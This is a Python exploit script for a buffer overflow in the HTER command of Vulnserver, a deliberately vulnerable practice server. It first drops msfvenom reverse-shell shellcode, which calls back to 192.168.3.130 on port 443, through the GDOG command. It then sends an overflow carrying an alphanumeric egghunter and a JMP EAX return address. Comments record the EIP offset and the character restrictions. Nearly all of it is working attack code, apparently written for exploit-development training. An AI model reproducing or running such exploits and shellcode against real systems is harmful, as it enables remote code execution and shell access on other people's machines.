# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc.		: Steve Bradshaw's Vulnserver Buffer Overflow [HTER Command]
# OS		: Windows Vista ULTIMATE x86 SP2
# Date		: 09,17/03/2018

import sys
import struct
from socket import create_connection as cc

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 9999

try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()

# Grab the banner
banner = sock.recv(1024)
print "Connected to ", host
print banner

payload = "HTER "
#payload += "A"*2500 + ":\\"


# EIP Overwrite at 2041, the 8 B's fill EIP as B's it self
# eg: payload = "A"*2041 + "41424345"
#	EIP = 45 43 42 41
# All the A's appear in stack as A itself, no translation happens
#
# 0102F9A0  AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA
# 0102F9B0  AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA
#

# echo -ne "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" |
# msfvenom -p- BufferRegister=EAX -f hex -b "\x00\x0a\x0d\x20" -e x86/alpha_mixed -a x86 --platform windows
egghunter = "50594949494949494949494949494949494937515a6a415850304130416b41415132414232424230424241425850384142754a4963564d515a6a596f644f43724632435a766273685a6d346e774c5665536a5254686f4d6862744470665073674c4b5a5a4c6f6255786a6c6f44356977596f48674141"

#payload += "A"*2041 + "B"*8

payload += "A" + egghunter + "A"*(2041-len(egghunter)-1) + "B1115062" + "C" * 500
# JMP EAX = 0040100C vulnserver.exe
# JMP EAX = 625011B1 essfunc.dll

payload += ":\\"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.130 LPORT=443 -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
shellcode =  "T00WT00W" + ("\xbe\xd0\xfe\x0e\xa1\xda\xd4\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x73\x0e\x03\xa3\xf0\xec\x54\xbf\xe5\x73"
"\x96\x3f\xf6\x13\x1e\xda\xc7\x13\x44\xaf\x78\xa4\x0e\xfd\x74"
"\x4f\x42\x15\x0e\x3d\x4b\x1a\xa7\x88\xad\x15\x38\xa0\x8e\x34"
"\xba\xbb\xc2\x96\x83\x73\x17\xd7\xc4\x6e\xda\x85\x9d\xe5\x49"
"\x39\xa9\xb0\x51\xb2\xe1\x55\xd2\x27\xb1\x54\xf3\xf6\xc9\x0e"
"\xd3\xf9\x1e\x3b\x5a\xe1\x43\x06\x14\x9a\xb0\xfc\xa7\x4a\x89"
"\xfd\x04\xb3\x25\x0c\x54\xf4\x82\xef\x23\x0c\xf1\x92\x33\xcb"
"\x8b\x48\xb1\xcf\x2c\x1a\x61\x2b\xcc\xcf\xf4\xb8\xc2\xa4\x73"
"\xe6\xc6\x3b\x57\x9d\xf3\xb0\x56\x71\x72\x82\x7c\x55\xde\x50"
"\x1c\xcc\xba\x37\x21\x0e\x65\xe7\x87\x45\x88\xfc\xb5\x04\xc5"
"\x31\xf4\xb6\x15\x5e\x8f\xc5\x27\xc1\x3b\x41\x04\x8a\xe5\x96"
"\x6b\xa1\x52\x08\x92\x4a\xa3\x01\x51\x1e\xf3\x39\x70\x1f\x98"
"\xb9\x7d\xca\x0f\xe9\xd1\xa5\xef\x59\x92\x15\x98\xb3\x1d\x49"
"\xb8\xbc\xf7\xe2\x53\x47\x90\xcc\x0c\x44\xe2\xa5\x4e\x4a\xe3"
"\x8e\xc6\xac\x89\xe0\x8e\x67\x26\x98\x8a\xf3\xd7\x65\x01\x7e"
"\xd7\xee\xa6\x7f\x96\x06\xc2\x93\x4f\xe7\x99\xc9\xc6\xf8\x37"
"\x65\x84\x6b\xdc\x75\xc3\x97\x4b\x22\x84\x66\x82\xa6\x38\xd0"
"\x3c\xd4\xc0\x84\x07\x5c\x1f\x75\x89\x5d\xd2\xc1\xad\x4d\x2a"
"\xc9\xe9\x39\xe2\x9c\xa7\x97\x44\x77\x06\x41\x1f\x24\xc0\x05"
"\xe6\x06\xd3\x53\xe7\x42\xa5\xbb\x56\x3b\xf0\xc4\x57\xab\xf4"
"\xbd\x85\x4b\xfa\x14\x0e\x7b\xb1\x34\x27\x14\x1c\xad\x75\x79"
"\x9f\x18\xb9\x84\x1c\xa8\x42\x73\x3c\xd9\x47\x3f\xfa\x32\x3a"
"\x50\x6f\x34\xe9\x51\xba")

shellcode_dropper = "GDOG " + shellcode

# USING THE HTER CRASH ALONE, I WAS ABLE TO POP ONLY CALC. FOR SOME REASON REVERSE/BIND SHELLS WERE NOT WORKING AS EXPECTED.
# SO I DECIDED TO INTRODUCE EGGHUNTER. PRIOR TO SENDING THE CRASH PAYLOAD, THE REVERSE/BIND SHELL PAYLOAD IS DROPPED IN MEMORY USING THE 
# GDOG COMMAND. LATER THE HTER CRASH PAYLOAD IS SENT AND EGGHUNTER FINDS, JUMPS TO AND EXECUTES THE REVERSE/BIND SHELL SHELLCODE SUCCESSFULLY.

# NOTE: THERE ARE RESTRICTIONS ON CHARACTERS. ESP WAS POINTING TO PART OF BUFFER (PORTION AFTER RET ADDRESS), HOWEVER, THIS AREA HAD SERIOUS 
# RESTRICTIONS ON ALLOWED CHARACTERS. (ABCDEF 0123456789). EAX WAS POINTING TO BEGINGIN OF OUR BUFFER AND ALPHA NUMERIC CHARACTERS WERE ALLOWED HERE.

print "[*] Sending payload to drop Shellcode in memory"
sock.send(shellcode_dropper)
print "[*] Closing Old Connection Socket"
sock.close()

print "[*] Creating new connection to target"
sock = cc((host, port))
print "[*] Sending UB3R payload via new socket"
sock.send(payload)
